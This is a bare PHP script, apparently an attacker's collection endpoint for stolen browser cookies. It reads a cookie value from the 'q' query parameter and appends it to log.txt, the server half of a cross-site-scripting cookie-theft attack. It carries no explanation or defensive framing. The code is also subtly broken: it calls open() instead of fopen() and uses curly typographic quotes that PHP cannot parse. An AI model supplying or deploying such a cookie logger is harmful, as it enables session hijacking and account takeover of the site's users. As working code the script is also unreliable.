<?php
$filename=”log.txt”;
$fp=open($filename, ‘a’);
$cookie=$_GET[‘q’];
fwrite($fp, $cookie);
fclose($fp);
?>
